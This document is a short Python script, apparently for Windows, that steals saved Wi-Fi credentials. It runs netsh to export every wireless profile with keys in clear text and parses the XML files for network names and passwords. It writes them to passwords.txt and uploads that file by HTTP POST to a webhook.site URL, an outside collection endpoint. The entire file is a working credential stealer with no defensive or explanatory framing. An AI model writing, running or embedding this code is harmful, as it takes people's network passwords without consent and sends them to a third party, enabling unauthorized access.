import os
import subprocess
import sys
import requests

url = 'https://webhook.site/28347439-bc2e-4ee6-ad97-7afe3a9faef4'

password_file = open('passwords.txt', "w")
password_file.write("hello here is passwords: \n\n")
password_file.close()

wifi_files = []
wifi_name = []
wifi_password = []

command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

path = os.getcwd()

for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i, 'r') as f:
                for line in f.readlines():
                    if 'name' in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_name.append(back)
                    if 'keyMaterial' in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_password.append(back)

                        for x, y in zip(wifi_name, wifi_password):
                            sys.stdout = open('passwords.txt', "a")
                            print("SSID:   " + x, "password:   " + y, sep='\n')
                            sys.stdout.close()

with open('passwords.txt', 'rb') as f:
    f = requests.post(url, data=f)                             

